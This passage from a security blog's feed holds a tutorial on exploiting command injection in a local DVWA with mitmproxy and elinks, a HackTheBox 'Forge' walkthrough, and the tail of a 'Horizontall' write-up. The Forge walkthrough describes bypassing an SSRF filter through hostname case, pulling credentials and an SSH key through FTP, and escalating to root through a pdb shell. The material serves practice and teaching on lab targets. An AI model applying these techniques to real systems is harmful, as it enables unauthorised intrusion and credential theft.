      <li>Setup a tunnel with SSH, which allowed me to exploit the <em>RCE</em> flaw.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="static analysis" /><category term="cve" /><category term="rce" /><category term="tunneling" /><summary type="html"><![CDATA[Horizontall is an easy linux box featuring two RCEs. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a Laravel instance running locally, which is also vulnerable to RCE, and will give you access to the box as root.]]></summary></entry><entry><title type="html">Exploiting Web Applications with MITM Proxy and Elinks</title><link href="https://4g3nt47.github.io/posts/tutorial/mitmproxy.html" rel="alternate" type="text/html" title="Exploiting Web Applications with MITM Proxy and Elinks" /><published>2022-01-25T00:00:00+01:00</published><updated>2022-01-25T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/tutorial/mitmproxy</id><content type="html" xml:base="https://4g3nt47.github.io/posts/tutorial/mitmproxy.html"><![CDATA[<p>In this little tutorial, I demonstrate how to use <code class="language-plaintext highlighter-rouge">mitmproxy</code> and <code class="language-plaintext highlighter-rouge">elinks</code> to exploit a vulnerable web app completely from the command line. The target used is DVWA (Damn Vulnerable Web Application), which is running locally in a docker container.</p>

<p><br /></p>

<h3 id="the-tools">The Tools</h3>
<p><br /></p>

<p><strong>Elinks</strong> is a console-based web browser that can be used to browse through websites from the command line. From the manual;</p>

<blockquote>
  <p>ELinks is a text mode WWW browser, supporting colors, table rendering, background downloading, menu driven configuration interface, tabbed browsing and slim code. Frames are supported. You can have different file formats associated with external viewers. mailto: and telnet: are supported via external clients. ELinks can handle both local files and remote URLs. The main supported remote URL protocols are HTTP, HTTPS (with SSL support compiled in) and FTP. Additional protocol support exists for BitTorrent finger, Gopher, SMB and NNTP. The homepage of ELinks can be found at <a href="http://elinks.cz/">http://elinks.cz/</a>, where the ELinks manual is also hosted.</p>
</blockquote>

<p><strong>MITM Proxy</strong> is a proxy that you can use from the terminal to inspect, modify, and replay HTTP traffic. Think of it as a console-based Burp Suite alternative. From the <a href="https://mitmproxy.org">official site</a>;</p>

<blockquote>
  <p>mitmproxy is your swiss-army knife for debugging, testing, privacy measurements, and penetration testing. It can be used to intercept, inspect, modify and replay web traffic such as HTTP/1, HTTP/2, WebSockets, or any other SSL/TLS-protected protocols. You can prettify and decode a variety of message types ranging from HTML to Protobuf, intercept specific messages on-the-fly, modify them before they reach their destination, and replay them to a client or server later on.</p>
</blockquote>

<p>In this post, I will be using the two tools mentioned to solve a challenge in <strong>DVWA</strong>.</p>

<p><br /></p>

<h4 id="setup">Setup</h4>
<p><br /></p>

<p>Now that we know the tools we need, let’s get started. You can install ELinks and MITM proxy in debian-based distros (which is what I’m using) with;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>elinks mimtproxy
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220124203128.png" alt="" /></p>

<p>I already have DVWA installed locally in my docker container, and there is a good tutorial <a href="https://www.golinuxcloud.com/install-dvwa-kali-linux/">here</a> on how to set it up.</p>

<p>With DVWA installed, it’s time to test the tools. You can open a URL in elinks using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>elinks &lt;url&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In my case, DVWA is installed at <code class="language-plaintext highlighter-rouge">http://localhost/dvwa/</code>. Running <code class="language-plaintext highlighter-rouge">elinks http://localhost/dvwa</code> load up the login page of DVWA;</p>

<p><img src="/assets/img/20220124203754.png" alt="" /></p>

<p>Using the default credentials of <code class="language-plaintext highlighter-rouge">admin:password</code>, I logged in successfully. Elinks is working!</p>

<p><img src="/assets/img/20220124203826.png" alt="" /></p>

<p>Now time to check out MITM proxy. But before we do that, we need to configure Elinks to proxy all HTTP(s) traffic through MITM proxy. A way to do that is by setting the global variables <code class="language-plaintext highlighter-rouge">HTTP_PROXY</code> and <code class="language-plaintext highlighter-rouge">HTTPS_PROXY</code> with the URL of our MITM proxy. Keeping in mind that MITM proxy by default runs on port <strong>8080</strong>, this can be configured using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">export </span><span class="nv">HTTP_PROXY</span><span class="o">=</span>http://localhost:8080
<span class="nv">$ </span><span class="nb">export </span><span class="nv">HTTPS_PROXY</span><span class="o">=</span>http://localhost:8080
</pre></td></tr></tbody></table></code></pre></div></div>

<p>With that step completed, we can now launch the proxy;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>mitmproxy
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Restarting Elinks and login into DVWA, you can see that all the requests (referred to as flows in MITM proxy) were routed through the proxy;</p>

<p><img src="/assets/img/20220124205246.png" alt="" /></p>

<p>Scrolling down the POST request used for login (using arrow keys), we could view the contents of the flow by hitting enter, or simply clicking on the flow;</p>

<p>(The request)</p>

<p><img src="/assets/img/20220124205644.png" alt="" /></p>

<p>(The response. You can view this by clicking the “Response” tab, or by simply pressing the <code class="language-plaintext highlighter-rouge">-&gt;</code> arrow key )</p>

<p><img src="/assets/img/20220124205708.png" alt="" /></p>

<p>To go back to the main menu, press <code class="language-plaintext highlighter-rouge">q</code>, which is used to “exit the current view” (you can view all key bindings by pressing <code class="language-plaintext highlighter-rouge">?</code>).</p>

<p><br /></p>

<h3 id="the-attack">The Attack</h3>
<p><br /></p>

<p>For this post, I will be exploiting a very easy <em>command injection</em> vulnerability in DVWA. User is provided with an input field to enter an IP address for the web application to ping;</p>

<p><img src="/assets/img/20220124210651.png" alt="" /></p>

<p>If you’ve used the <code class="language-plaintext highlighter-rouge">ping</code> utility before, the output above will look very familiar, as it is the one generated by the <code class="language-plaintext highlighter-rouge">ping</code> command. We can quickly test this from the console;</p>

<p><img src="/assets/img/20220124210853.png" alt="" /></p>

<p>This indicate the the IP we entered is likely being included in a shell command. This can be tested by going to back to our proxy, and playing around with the request.</p>

<p><img src="/assets/img/20220124211239.png" alt="" /></p>

<p>We can modify the contents of a request in the proxy by pressing <code class="language-plaintext highlighter-rouge">e</code> (edit), which will open a small menu asking us what we would like to edit. Since we are targeting a POST parameter, which is in the body of the request, our choice is <code class="language-plaintext highlighter-rouge">2</code>;</p>

<p><img src="/assets/img/20220124211545.png" alt="" /></p>

<p>This will open another window containing the name and values of all the form parameters. Move to the field containing <code class="language-plaintext highlighter-rouge">localhost</code> (the value we would like to change) and press enter to start the edit;</p>

<p><img src="/assets/img/20220124211741.png" alt="" /></p>

<p>After you are done, press <code class="language-plaintext highlighter-rouge">esc</code> key (to leave edit mode in the field) and then <code class="language-plaintext highlighter-rouge">q</code> to go back to the flow menu. As you can see in the below image, the request has been modified successfully;</p>

<p><img src="/assets/img/20220124212151.png" alt="" /></p>

<p>Now we need to send the modified request to the server. To do so, just hit <code class="language-plaintext highlighter-rouge">r</code> (replay). A small green circle marker should appear near the URL at the top of the proxy window, which indicate the flow has been replayed. Going to the response tab, we can see that the injected command was executed;</p>

<p><img src="/assets/img/20220124212931.png" alt="" /></p>

<p><br /></p>

<h3 id="staying-focused">Staying Focused</h3>
<p><br /></p>

<h4 id="using-filters">Using Filters</h4>
<p><br /></p>

<p>MITM proxy by default will log every request sent through it and will show it to you in the main menu. This often gets distracting as the requests pile up. A way to solve this is to set up a filter using <em>regular expression</em> so that only flows you are interested in are displayed. Example: In the below image, MITM proxy is showing flows we have <strong>0</strong> interest in;</p>

<p><img src="/assets/img/20220124214144.png" alt="" /></p>

<p>Since we know all URLs for DVWA start with <code class="language-plaintext highlighter-rouge">http://localhost/dvwa</code>, we can set up a filter by pressing <code class="language-plaintext highlighter-rouge">f</code>, which opens the command prompt of MITM proxy and prefix it with <code class="language-plaintext highlighter-rouge">set view filter=</code> (we can manually open the command prompt by typing <code class="language-plaintext highlighter-rouge">:</code>), and typing <code class="language-plaintext highlighter-rouge">~u http://localhost/dvwa</code>;</p>

<p><img src="/assets/img/20220124214743.png" alt="" /></p>

<p>Press enter, and watch the filter come to live;</p>

<p><img src="/assets/img/20220124214831.png" alt="" /></p>

<p>It is possible to set the filter to match more than one URL using the logical OR <code class="language-plaintext highlighter-rouge">|</code> operator. For example: <code class="language-plaintext highlighter-rouge">~u http://localhost/dvwa|https://google.com</code> will display flows to DVWA, and Google.</p>

<p>Note that the <code class="language-plaintext highlighter-rouge">~u</code> in front of the URL is what indicate what the pattern should be matched against. You can view other filter rules by pressing <code class="language-plaintext highlighter-rouge">?</code> and clicking on the <code class="language-plaintext highlighter-rouge">Filter Expressions</code> tab (or pressing the <code class="language-plaintext highlighter-rouge">-&gt;</code> key). You can match request body, response body, HTTP response code, request headers, and much more!</p>

<p><br /></p>

<h4 id="marking-flows">Marking flows</h4>
<p><br /></p>

<p>Another useful feature of <code class="language-plaintext highlighter-rouge">mitmproxy</code> that help you focus is the ability to “mark” a flow in the main menu. Just press <code class="language-plaintext highlighter-rouge">m</code> while hovering over a flow, and that flow will be marked (or unmaked, depending on it’s state). Notice the red dot in the image below, which indicate a marked flow;</p>

<p><img src="/assets/img/20220125060205.png" alt="" /></p>

<p>After marking flows you are interested in, hit <code class="language-plaintext highlighter-rouge">M</code> to make the proxy display only flows that were marked. Press <code class="language-plaintext highlighter-rouge">M</code> again to disable this feature.</p>

<p><br /></p>

<h3 id="the-intercepts">The Intercepts</h3>
<p><br /></p>

<p>Very often you would want to modify a request after it left a browser, but before it reaches a server. This is called an intercept, and MITM proxy can be used to do this.</p>

<p>To intercept a request, you will need to define a scope, which is done using similar expressions used in filtering flows showed in the proxy menu. In the main menu, press <code class="language-plaintext highlighter-rouge">i</code>, which will open the command prompt and prefix it with <code class="language-plaintext highlighter-rouge">set intercept=</code>. In our example, we can intercept all requests made to DVWA by typing <code class="language-plaintext highlighter-rouge">~u http://localhost/dvwa</code> and pressing enter.</p>

<p><img src="/assets/img/20220124220506.png" alt="" /></p>

<p>With the intercept in place, once we visit a page that matches the given URL, the browser will hang and MITM proxy will present us with the intercepted request, which will be colored red;</p>

<p><img src="/assets/img/20220124221008.png" alt="" /></p>

<p>Clicking on flow, we can do all the modifications we want on it. Let’s change the URL and make it point to a different path. We can do so by pressing <code class="language-plaintext highlighter-rouge">e</code> and selecting <code class="language-plaintext highlighter-rouge">url</code> in the option;</p>

<p><img src="/assets/img/20220124221343.png" alt="" /></p>

<p>As you can see, after hitting enter, the flow has been successfully modified;</p>

<p><img src="/assets/img/20220124221439.png" alt="" /></p>

<p>To forward this modified request to the server, press <code class="language-plaintext highlighter-rouge">a</code>. This will forward the request to the server and obtain a response. Note that the response is also intercepted, which gives you a chance to inspect or modify it. After you are done, hit <code class="language-plaintext highlighter-rouge">a</code> again to forward the response back to the browser. You can also kill an intercepted flow by pressing <code class="language-plaintext highlighter-rouge">X</code> in the main menu.</p>

<p>Sometimes, you are only interested in modifying one intercepted flow, and the number of intercepted flows may start to pile up.  In this case, you can forward all intercepted flows after you are done with your modifications by pressing <code class="language-plaintext highlighter-rouge">A</code> in the main menu. You can also quickly enable/disable your configured intercept by pressing <code class="language-plaintext highlighter-rouge">I</code>, which will cause an <code class="language-plaintext highlighter-rouge">X</code> to appear in the beginning of your intercept rule;</p>

<p><img src="/assets/img/20220124222527.png" alt="" /></p>

<p><br /></p>

<h3 id="persistence">Persistence</h3>
<p><br /></p>

<p>You may often need to save the work you have done in MITM proxy so that you can resume from where you stop, or just for record keeping. MITM proxy allows you to save all the listed flows from the main menu by pressing <code class="language-plaintext highlighter-rouge">w</code>, and typing the name of the file you want to save the flows as;</p>

<p><img src="/assets/img/20220125061030.png" alt="" /></p>

<p>The above will save the flows as <code class="language-plaintext highlighter-rouge">dvwa.flows</code>. Alternatively, you can save an individual flow by opening the flow (by clicking on it) and pressing <code class="language-plaintext highlighter-rouge">w</code>, which will prompt you for a filename.</p>

<p>To load the saved flows next time you launch the proxy, press <code class="language-plaintext highlighter-rouge">L</code> in the main menu, and enter the name of the file containing the flows;</p>

<p><img src="/assets/img/20220125061540.png" alt="" /></p>

<p><br /></p>

<h3 id="bonus">Bonus</h3>
<p><br /></p>

<h4 id="responsible-modifications">Responsible Modifications</h4>
<p><br /></p>

<p>When modifying a flow in MITM proxy, you should always start by making a copy of it. That way, you have an unmodified copy you can go back to if you messed up the copy you are working on, or just for reference purposes. You can duplicate a flow in the main menu by pressing <code class="language-plaintext highlighter-rouge">D</code> while hovering over the flow;</p>

<p><img src="/assets/img/20220125062045.png" alt="" /></p>

<p>To delete a flow you no longer need, just press <code class="language-plaintext highlighter-rouge">d</code> while hovering on it. You can also wipe out all flows by pressing <code class="language-plaintext highlighter-rouge">z</code>.</p>

<p><br /></p>

<h4 id="mitm-web">MITM Web</h4>
<p><br /></p>

<p>MITM proxy comes with another program, <code class="language-plaintext highlighter-rouge">mitmweb</code>, which you can use to start a proxy that you can control through a web browser. To use this, do;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>mitmweb
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above will start a proxy server on port <strong>8080</strong>, and the web interface of the proxy on port <strong>8081</strong>.  Going to <code class="language-plaintext highlighter-rouge">http://localhost:80801</code>, you will be presented with the web UI of MITM proxy;</p>

<p><img src="/assets/img/20220124223828.png" alt="" /></p>

<p><br /></p>

<h3 id="conclusion">Conclusion</h3>
<p><br /></p>

<p>MITM proxy is a very nice tool that you can use to easily study and modify web traffic. It has a bit of a learning curve like most tools, but once you get the hang of it, it is quite amazing. The key bindings make most of the tasks a lot less painful. I find myself using it quite often when all I need is a few basic web proxy functionalities.</p>]]></content><author><name></name></author><category term="tutorial" /><category term="mitmproxy" /><category term="mitmweb" /><category term="elinks" /><category term="dvwa" /><category term="web" /><category term="proxy" /><category term="command injection" /><summary type="html"><![CDATA[In this little tutorial, I demonstrate how to use mitmproxy and elinks to exploit a vulnerable web app completely from the command line. The target used is DVWA (Damn Vulnerable Web Application), which is running locally in a docker container.]]></summary></entry><entry><title type="html">Forge - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/forge.html" rel="alternate" type="text/html" title="Forge - HackTheBox" /><published>2022-01-23T00:00:00+01:00</published><updated>2022-01-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/forge</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/forge.html"><![CDATA[<p><strong>Forge</strong> is a very nice medium linux box featuring a web service that allows for local and remote file upload (via URL). After the upload, user is given a random URL to access the uploaded file. This URL upload functionality has a filter that attempts to block SSRFs, but the filter is flawed, and could be exploited to reach another subdomain on the server that foreign hosts are not allowed to directly access. The vector for privilege escalation is a python script that drops into a <code class="language-plaintext highlighter-rouge">pdb</code> shell when user caused an exception.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211021202532.png" alt="" /></p>

<p><img src="/assets/img/20211021202603.png" alt="" /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Thu Oct 21 20:28:51 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.111
Nmap scan report for forge.htb (10.10.11.111)
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 21 20:29:42 2021 -- 1 IP address (1 host up) scanned in 51.39 seconds
</code></pre>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211021203128.png" alt="" /></p>

<p>There is an image upload functionality at <code class="language-plaintext highlighter-rouge">/upload</code> that the homepage links to;</p>

<p><img src="/assets/img/20211021203329.png" alt="" /></p>

<p>Uploading a sample image file saves it to the below location on the server;</p>

<p><img src="/assets/img/20211021203701.png" alt="" /></p>

<p>Clicking the <strong>Upload from url</strong> in the page above gave me an input field for a URL. Attempts to load a local file using the <code class="language-plaintext highlighter-rouge">file://</code> protocol failed, saying only HTTP and HTTPs protocols are allowed. Entering a URL to my attack host, I got a callback;</p>

<p><img src="/assets/img/20211021204138.png" alt="" /></p>

<p>The <em>python-requests</em> user agent in the header of the request makes me suspect this is some kind of Python WSGI web application. Such applications, from my experience, are an absolute pain to gain command execution through arbitrary file uploads due to the special way they handle paths, so I’m going to ignore this.</p>

<p>Bruteforcing the web root with <code class="language-plaintext highlighter-rouge">ffuf</code> didn’t yield anything of interest, but bruteforcing for hidden subdomains found one (I had to filter out HTTP redirects as all invalid subdomains result in them);</p>

<p><img src="/assets/img/20211021210015.png" alt="" /></p>

<p>Going to the link, I was told access is only allowed to localhost;</p>

<p><img src="/assets/img/20211021210419.png" alt="" /></p>

<p>Judging from the name of the box, this makes me suspect I need to do some request forgery to fool the web app into thinking I am connecting from localhost. Bruteforcing it’s web root found a directory named <code class="language-plaintext highlighter-rouge">static</code>, which is similar to the <code class="language-plaintext highlighter-rouge">/static</code> page found on <code class="language-plaintext highlighter-rouge">forge.htb</code>, except the latter contains an <code class="language-plaintext highlighter-rouge">images</code> directory.</p>

<p>My first approach to get around this was to use the image upload functionality on <code class="language-plaintext highlighter-rouge">forge.htb/upload</code>. I tried to get web app to send a request to the admin domain, which was blocked;</p>

<p><img src="/assets/img/20211021211702.png" alt="" /></p>

<p>My next step was using special HTTP headers to fool the web app into thinking the request to http://admin.forge.htb came from a different host. It didn’t work. So I performed a full port scan on the host in hope that I missed something that may be used to access this page, like a proxy service. No new port was discovered.
<br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Replacing the subdomain in the URL upload functionality with a random string while keeping the <code class="language-plaintext highlighter-rouge">forge.htb</code> hostname resulted in the same <strong>URL contains blacklisted address</strong> response, which indicate the web app is probably not using it to filter submitted URLs, but rather the hostname. Since hostnames are case-insensitive, I tried to bypass the filter by changing the case of the hostname, and it worked;</p>

<p><img src="/assets/img/20211021222100.png" alt="" /></p>

<p>The web app does not appear to be validating if the contents fetched from the given URL is infact a valid image data, which allowed me to read the HTML code of the <em>admin.forge.htb</em> domain by <code class="language-plaintext highlighter-rouge">curl</code>ing the returned URL;</p>

<p><img src="/assets/img/20211021222355.png" alt="" /></p>

<p>Using the same trick to use the <code class="language-plaintext highlighter-rouge">file://</code> protocol to read local files didn’t work. The above HTML code revealed the path <code class="language-plaintext highlighter-rouge">/announcements</code>. Using the URL upload trick above, the file was dumped, and was found to contain some very interesting info, including the credential <code class="language-plaintext highlighter-rouge">user:heightofsecurity123!</code>;</p>

<p><img src="/assets/img/20211021223240.png" alt="" /></p>

<p>Attempting to connect to the SSH service using the credential showed the SSH server is likely configured to only allow public key authentication.</p>

<p>The contents of the <code class="language-plaintext highlighter-rouge">admin.forge.htb/announcement</code> page said it has a file upload function that can be invoked using HTTP request to <code class="language-plaintext highlighter-rouge">/upload</code> with the URL passed in the GET parameter <code class="language-plaintext highlighter-rouge">u</code>, so tried to use the <code class="language-plaintext highlighter-rouge">file://</code> protocol via this <code class="language-plaintext highlighter-rouge">u</code> parameter. The upload returned a success message, but <code class="language-plaintext highlighter-rouge">curl</code>ing the file showed the protocol was blocked, and listed the protocols that are allowed;</p>

<p><img src="/assets/img/20211021225241.png" alt="" /></p>

<p>Testing the FTP protocol by giving it an FTP URL to my attack host (<code class="language-plaintext highlighter-rouge">ftp://testuser:testpass@&lt;my-IP&gt;/</code>) with test credentials, <code class="language-plaintext highlighter-rouge">tcpdump</code> captured an authentication attempt for the target host;</p>

<p><img src="/assets/img/20211021230330.png" alt="" /></p>

<p>Since NMAP has initially reported an FTP service on the host on port <strong>21</strong> as <em>filtered</em>, I used the credentials of <code class="language-plaintext highlighter-rouge">user</code> that was previously obtained to connect to the FTP service running locally on the target. It didn’t work, saying the <strong>URL contains a blacklisted address</strong>. Using the change of case trick used previously bypassed the filter;</p>

<p><img src="/assets/img/20211021231218.png" alt="" /></p>

<p>Requesting the generated link with <code class="language-plaintext highlighter-rouge">curl</code>, I got the contents of the root directory of the FTP service;</p>

<p><img src="/assets/img/20211021231318.png" alt="" /></p>

<p>The presence of the <code class="language-plaintext highlighter-rouge">user.txt</code> file indicate the FTP root directory is the home directory of a user. And since the SSH service on the host is blocking password authentication, I’m guessing the user will have public key authentication configured. So I crafted a request for <code class="language-plaintext highlighter-rouge">.ssh/id_rsa</code>, which will be the private key file of the user, and it worked;</p>

<p><img src="/assets/img/20211021231746.png" alt="" /></p>

<p><img src="/assets/img/20211021231826.png" alt="" /></p>

<p>I saved the SSH private key as <code class="language-plaintext highlighter-rouge">id_rsa</code>, <code class="language-plaintext highlighter-rouge">chmod 600</code> it, and gained access to the box as <code class="language-plaintext highlighter-rouge">user</code> over SSH;</p>

<p><img src="/assets/img/20211021232416.png" alt="" />
<br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Inside the box as <code class="language-plaintext highlighter-rouge">user</code>, I have <code class="language-plaintext highlighter-rouge">sudo</code> permission to run a python program;</p>

<p><img src="/assets/img/20211021233011.png" alt="" /></p>

<p>The code of the script;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">pdb</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter the secret passsword: '</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s">'secretadminpassword'</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Wrong password!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome admin!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">What do you wanna do: </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[1] View processes</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[2] View free memory</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[3] View listening sockets</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[4] Quit</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">())</span>
            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ps aux'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'df'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ss -lnt'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Bye</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                <span class="k">break</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="n">pdb</span><span class="p">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">__traceback__</span><span class="p">)</span>
<span class="k">finally</span><span class="p">:</span>
    <span class="n">quit</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p><br /></p>

<h4 id="program-logic">Program Logic</h4>
<p><br /></p>

<p>The program, when executed, binds to a random port. When a connection is received, it asks for a password, which must be <code class="language-plaintext highlighter-rouge">secretadminpassword</code>. If the password is incorrect, the connection is killed. If the password is correct, user is given a bunch of options of the task they wish to perform. This choice is casted to an integer using <code class="language-plaintext highlighter-rouge">int()</code>, and the selected action, if valid, is performed. Should an exception occur during all this, the exception will be printed (<code class="language-plaintext highlighter-rouge">print(e)</code>), and a <code class="language-plaintext highlighter-rouge">pdb</code> (Python Debugger) shell will be spawned in the command prompt that invoked the script.
<br /></p>

<h4 id="exploit">Exploit</h4>
<p><br /></p>

<p>A <code class="language-plaintext highlighter-rouge">pdb</code> shell is a powerful shell that can be used to access all the functionalities of the python interpreter. Since user input is directly casted to an integer, and any error will result in the <code class="language-plaintext highlighter-rouge">pdb</code> shell being launched, I was able to exploit this by simply connecting to the listener created by the script from another terminal using the locally installed <code class="language-plaintext highlighter-rouge">netcat</code> program, provide the valid password, and give a non-numeric input when asked for the task to perform;</p>

<p><img src="/assets/img/20211021235326.png" alt="" />
<br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
